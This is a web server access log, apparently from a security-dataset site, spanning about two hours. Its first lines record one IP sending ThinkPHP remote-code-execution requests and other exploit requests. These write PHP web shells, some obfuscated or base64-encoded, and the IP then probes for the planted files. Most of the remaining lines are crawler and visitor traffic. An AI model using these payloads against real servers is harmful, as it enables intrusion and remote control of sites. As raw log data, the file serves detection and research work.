43.154.103.197 - - [12/Jun/2023:05:03:31 -0700] "GET /?s=index/\\think\\template\\driver\\file/write&cacheFile=robots1.php&content=xbshell<?php%20@eval($_POST[admin]);?> HTTP/1.1" 418 746 "http://www.secrepo.com/?s=index/\\think\\template\\driver\\file/write&cacheFile=robots1.php&content=xbshell<?php @eval($_POST[admin]);?>" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
43.154.103.197 - - [12/Jun/2023:05:03:31 -0700] "GET /robots1.php HTTP/1.1" 404 305 "http://www.secrepo.com/robots1.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
43.154.103.197 - - [12/Jun/2023:05:03:31 -0700] "GET /?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=12345.php&vars[1][1]=<?php%20$poc%20=\"axsxsxexrxt\";$poc_1%20=%20explode(\"x\",%20$poc);%20$poc_2%20=%20$poc_1[0]%20.%20$poc_1[1]%20.%20$poc_1[2]%20.%20$poc_1[3].%20$poc_1[4].%20$poc_1[5];$poc_2(urldecode(urldecode(urldecode($_REQUEST['12345']))));?> HTTP/1.1" 418 746 "http://www.secrepo.com/?" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
43.154.103.197 - - [12/Jun/2023:05:03:31 -0700] "GET /12345.php HTTP/1.1" 404 305 "http://www.secrepo.com/12345.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
43.154.103.197 - - [12/Jun/2023:05:03:32 -0700] "GET /?s=index/\\think\\template\\driver\\file/write&cacheFile=robots.php&content=xbshell1<?php$password%20=%20\"xinba\";$ch%20=%20explode(\".\",\"hello.ass.world.er.t\");array_intersect_ukey(array($_REQUEST[$password]%20=>%201),%20array(1),%20$ch[1].$ch[3].$ch[4]);?> HTTP/1.1" 418 746 "http://www.secrepo.com?s=index/\\think\\template\\driver\\file/write&cacheFile=robots.php&content=xbshell1<?php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
43.154.103.197 - - [12/Jun/2023:05:03:32 -0700] "GET /robots.php HTTP/1.1" 404 305 "http://www.secrepo.com/robots.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
43.154.103.197 - - [12/Jun/2023:05:03:32 -0700] "GET /?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET[%27fuck%27]);&fuck=fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz54YnNoZWxs)); HTTP/1.1" 418 746 "http://www.secrepo.com/?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET[%27fuck%27]);&fuck=fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz54YnNoZWxs));" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
43.154.103.197 - - [12/Jun/2023:05:03:33 -0700] "GET /x.php HTTP/1.1" 404 305 "http://www.secrepo.com/x.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
43.154.103.197 - - [12/Jun/2023:05:03:33 -0700] "GET /SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&userKeyPrefix=test&downloadUrl=aZlBAFKTavCnFX10p8sNYfr9FRNHM0slash0XP8EW1kEnDr4pNGA7T2XSz0yCY0add0MS3NiuXiz7rZruw8zMDybqtdhCgxw7u0ZCkLl9cxsma6ZWqYd0G56lB6242DFnwb6xxK4AudqJ0add0gNU9tDxOqBwAd37smw0equals00equals0&directoryName=sectest HTTP/1.1" 404 305 "http://www.secrepo.com/SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&userKeyPrefix=test&downloadUrl=aZlBAFKTavCnFX10p8sNYfr9FRNHM0slash0XP8EW1kEnDr4pNGA7T2XSz0yCY0add0MS3NiuXiz7rZruw8zMDybqtdhCgxw7u0ZCkLl9cxsma6ZWqYd0G56lB6242DFnwb6xxK4AudqJ0add0gNU9tDxOqBwAd37smw0equals00equals0&directoryName=sectest" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
43.154.103.197 - - [12/Jun/2023:05:03:33 -0700] "GET /SiteFiles/SiteTemplates/sectest/include.aspx HTTP/1.1" 404 305 "http://www.secrepo.com/SiteFiles/SiteTemplates/sectest/include.aspx" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
43.154.103.197 - - [12/Jun/2023:05:03:34 -0700] "POST /index.php?s=index HTTP/1.1" 404 305 "http://www.secrepo.com/index.php?s=index" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
43.154.103.197 - - [12/Jun/2023:05:03:34 -0700] "GET /index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=update_avatar&file=data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUW2FkbWluXSk7Pz54YnNoZWxs HTTP/1.1" 404 305 "http://www.secrepo.com/index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=update_avatar&file=data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUW2FkbWluXSk7Pz54YnNoZWxs" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
43.154.103.197 - - [12/Jun/2023:05:03:34 -0700] "GET /uploadfile/member/0/0x0.php HTTP/1.1" 404 305 "http://www.secrepo.com/uploadfile/member/0/0x0.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
43.154.103.197 - - [12/Jun/2023:05:03:35 -0700] "GET /index.php HTTP/1.1" 404 291 "http://www.secrepo.com/index.php" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
43.154.103.197 - - [12/Jun/2023:05:03:35 -0700] "GET /config.php HTTP/1.1" 418 710 "http://www.secrepo.com/config.php" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
43.154.103.197 - - [12/Jun/2023:05:03:36 -0700] "GET /phpinfo.php HTTP/1.1" 404 291 "http://www.secrepo.com/phpinfo.php" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
43.154.103.197 - - [12/Jun/2023:05:03:36 -0700] "GET / HTTP/1.1" 200 13149 "http://www.secrepo.com" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
43.154.103.197 - - [12/Jun/2023:05:03:36 -0700] "GET /hmseo.php HTTP/1.1" 404 284 "http://www.secrepo.com/hmseo.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
43.154.103.197 - - [12/Jun/2023:05:03:37 -0700] "POST /utility/convert/data/config.inc.php HTTP/1.1" 418 691 "http://www.secrepo.com/utility/convert/data/config.inc.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
43.154.103.197 - - [12/Jun/2023:05:03:37 -0700] "POST /utility/convert/data/config.inc.php HTTP/1.1" 404 250 "http://www.secrepo.com/utility/convert/data/config.inc.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
43.154.103.197 - - [12/Jun/2023:05:03:37 -0700] "POST /index.php?m=vod-search HTTP/1.1" 418 691 "http://www.secrepo.com/index.php?m=vod-search" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
43.154.103.197 - - [12/Jun/2023:05:03:38 -0700] "GET /c.php HTTP/1.1" 404 250 "http://www.secrepo.com/c.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
43.154.103.197 - - [12/Jun/2023:05:03:38 -0700] "POST /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 404 305 "http://www.secrepo.com/index.php?m=member&c=index&a=register&siteid=1" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
43.154.103.197 - - [12/Jun/2023:05:03:38 -0700] "GET /?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('hmseo.php','<?php%20@eval($_POST[hm]);?>hmseo')</php> HTTP/1.1" 418 746 "http://www.secrepo.com/?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('hmseo.php','<?php @eval($_POST[hm]);?>hmseo')</php>" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
43.154.103.197 - - [12/Jun/2023:05:03:38 -0700] "GET /hmseo.php HTTP/1.1" 404 305 "http://www.secrepo.com/hmseo.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
51.222.253.6 - - [12/Jun/2023:05:04:40 -0700] "GET / HTTP/1.1" 200 13142 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
118.191.130.83 - - [12/Jun/2023:05:18:17 -0700] "GET / HTTP/1.1" 200 13149 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
118.191.130.83 - - [12/Jun/2023:05:18:35 -0700] "GET / HTTP/1.1" 200 13149 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
118.191.130.83 - - [12/Jun/2023:05:18:50 -0700] "GET / HTTP/1.1" 200 13149 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
114.75.208.166 - - [12/Jun/2023:05:26:27 -0700] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0" 
114.75.208.166 - - [12/Jun/2023:05:26:27 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0" 
114.75.208.166 - - [12/Jun/2023:05:26:29 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27893 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0" 
114.75.208.166 - - [12/Jun/2023:05:26:29 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7556 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0" 
114.75.208.166 - - [12/Jun/2023:05:26:29 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0" 
114.75.208.166 - - [12/Jun/2023:05:27:40 -0700] "GET /css/style.css HTTP/1.1" 404 328 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0" 
114.75.208.166 - - [12/Jun/2023:05:27:53 -0700] "GET /squid/access.log.gz HTTP/1.1" 200 1614760 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0" 
123.183.224.66 - - [12/Jun/2023:05:33:53 -0700] "GET / HTTP/1.1" 200 13150 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
94.27.224.0 - - [12/Jun/2023:05:44:29 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 304 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.43" 
51.222.253.7 - - [12/Jun/2023:05:49:27 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/dpd.html HTTP/1.1" 200 1611 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
122.10.45.214 - - [12/Jun/2023:05:52:23 -0700] "GET /login.php?s=Admin/login HTTP/1.1" 429 476 "-" "python-requests/2.31.0" 
223.247.155.185 - - [12/Jun/2023:06:03:13 -0700] "GET /demo/js/common.js HTTP/1.1" 404 328 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0" 
223.247.155.185 - - [12/Jun/2023:06:03:16 -0700] "GET /css/album.css HTTP/1.1" 404 328 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0" 
223.247.155.185 - - [12/Jun/2023:06:17:17 -0700] "GET /data/admin/allowurl.txt HTTP/1.1" 404 328 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0" 
113.211.104.28 - - [12/Jun/2023:06:22:16 -0700] "GET / HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1" 
113.211.104.28 - - [12/Jun/2023:06:22:16 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1" 
113.211.104.28 - - [12/Jun/2023:06:22:17 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7533 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1" 
113.211.104.28 - - [12/Jun/2023:06:22:17 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27916 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1" 
113.211.104.28 - - [12/Jun/2023:06:22:18 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1" 
216.244.66.245 - - [12/Jun/2023:06:27:13 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
123.125.109.142 - - [12/Jun/2023:06:28:59 -0700] "GET / HTTP/1.1" 200 13148 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
42.228.9.78 - - [12/Jun/2023:06:33:34 -0700] "GET /favicon.ico HTTP/1.1" 200 391 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.37" 
114.119.152.97 - - [12/Jun/2023:06:35:01 -0700] "GET /self.logs/error.log.2020-10-15 HTTP/1.1" 200 351 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.155.81 - - [12/Jun/2023:06:35:41 -0700] "GET /self.logs/error.log.2020-07-01 HTTP/1.1" 200 351 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.158.45 - - [12/Jun/2023:06:38:21 -0700] "GET /self.logs/error.log.2021-01-14 HTTP/1.1" 200 351 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
117.66.240.95 - - [12/Jun/2023:06:38:56 -0700] "GET /adadaddadad HTTP/1.1" 404 328 "-" "python-requests/2.27.1" 
114.119.159.186 - - [12/Jun/2023:06:40:25 -0700] "GET /self.logs/error.log.2020-06-11 HTTP/1.1" 200 351 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.146.69 - - [12/Jun/2023:06:41:45 -0700] "GET /Datasets%20Description/?C=M%3BO%3DA HTTP/1.1" 200 677 "http://www.secrepo.com/Datasets%20Description" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
116.179.33.13 - - [12/Jun/2023:06:41:46 -0700] "GET /robots.txt HTTP/1.1" 200 340 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
116.179.33.17 - - [12/Jun/2023:06:41:47 -0700] "GET /robots.txt HTTP/1.1" 200 340 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
116.179.32.33 - - [12/Jun/2023:06:41:47 -0700] "GET /self.logs/ HTTP/1.1" 200 43426 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
114.119.137.95 - - [12/Jun/2023:06:42:28 -0700] "GET /self.logs/error.log.2020-02-17 HTTP/1.1" 200 351 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
123.183.224.66 - - [12/Jun/2023:06:42:51 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
162.55.86.60 - - [12/Jun/2023:06:48:23 -0700] "GET /robots.txt HTTP/1.1" 301 495 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [12/Jun/2023:06:48:23 -0700] "GET /robots.txt HTTP/1.1" 200 377 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [12/Jun/2023:06:48:24 -0700] "GET /sitemap HTTP/1.1" 301 489 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [12/Jun/2023:06:48:24 -0700] "GET /robots.txt HTTP/1.1" 200 354 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [12/Jun/2023:06:48:24 -0700] "GET /sitemap HTTP/1.1" 404 328 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [12/Jun/2023:06:48:41 -0700] "GET /sitemap HTTP/1.1" 404 328 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [12/Jun/2023:06:49:17 -0700] "GET /sitemap.txt HTTP/1.1" 301 497 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [12/Jun/2023:06:49:17 -0700] "GET /sitemap.txt HTTP/1.1" 404 328 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [12/Jun/2023:06:49:35 -0700] "GET /sitemap.txt HTTP/1.1" 404 328 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [12/Jun/2023:06:50:28 -0700] "GET /Datasets%20Description/?C=D;O=A HTTP/1.1" 200 677 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [12/Jun/2023:06:50:46 -0700] "GET /Datasets%20Description/?C=M;O=A HTTP/1.1" 200 677 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [12/Jun/2023:06:51:03 -0700] "GET /Datasets%20Description/?C=N;O=D HTTP/1.1" 200 673 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [12/Jun/2023:06:51:23 -0700] "GET /Datasets%20Description/?C=S;O=A HTTP/1.1" 200 677 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [12/Jun/2023:06:51:41 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/ HTTP/1.1" 200 834 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [12/Jun/2023:06:52:16 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/?C=D;O=D HTTP/1.1" 200 833 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [12/Jun/2023:06:52:52 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/?C=M;O=D HTTP/1.1" 200 833 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [12/Jun/2023:06:53:09 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/?C=N;O=A HTTP/1.1" 200 834 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [12/Jun/2023:06:54:03 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/?C=S;O=D HTTP/1.1" 200 829 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
114.119.135.171 - - [12/Jun/2023:06:55:52 -0700] "GET /self.logs/error.log.2020-10-23 HTTP/1.1" 200 351 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.133.158 - - [12/Jun/2023:06:55:55 -0700] "GET /self.logs/error.log.2020-12-24 HTTP/1.1" 200 351 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
175.44.42.49 - - [12/Jun/2023:06:56:28 -0700] "GET / HTTP/1.1" 200 13186 "http://www.ethelsblog.online/" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1" 
114.119.132.149 - - [12/Jun/2023:06:58:21 -0700] "GET /self.logs/error.log.2020-06-19 HTTP/1.1" 200 351 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
162.55.86.60 - - [12/Jun/2023:06:58:32 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/ HTTP/1.1" 200 832 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
114.119.143.114 - - [12/Jun/2023:06:58:35 -0700] "GET /self.logs/error.log.2020-06-09 HTTP/1.1" 200 351 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
162.55.86.60 - - [12/Jun/2023:06:59:08 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/?C=D;O=D HTTP/1.1" 200 832 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [12/Jun/2023:06:59:43 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/?C=M;O=D HTTP/1.1" 200 832 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [12/Jun/2023:07:00:01 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/?C=N;O=A HTTP/1.1" 200 832 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [12/Jun/2023:07:00:54 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/?C=S;O=D HTTP/1.1" 200 827 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
180.149.212.118 - - [12/Jun/2023:07:02:41 -0700] "GET /Datasets%20Description/PE_malware/VirusShare.html HTTP/1.1" 200 1651 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.43" 
180.149.212.118 - - [12/Jun/2023:07:02:42 -0700] "GET /favicon.ico HTTP/1.1" 200 368 "http://www.secrepo.com/Datasets%20Description/PE_malware/VirusShare.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.43" 
162.55.86.60 - - [12/Jun/2023:07:05:26 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/ HTTP/1.1" 200 823 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [12/Jun/2023:07:06:02 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/?C=D;O=D HTTP/1.1" 200 822 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [12/Jun/2023:07:06:38 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/?C=M;O=D HTTP/1.1" 200 822 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [12/Jun/2023:07:06:56 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/?C=N;O=A HTTP/1.1" 200 823 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
162.55.86.60 - - [12/Jun/2023:07:07:49 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/?C=S;O=D HTTP/1.1" 200 819 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
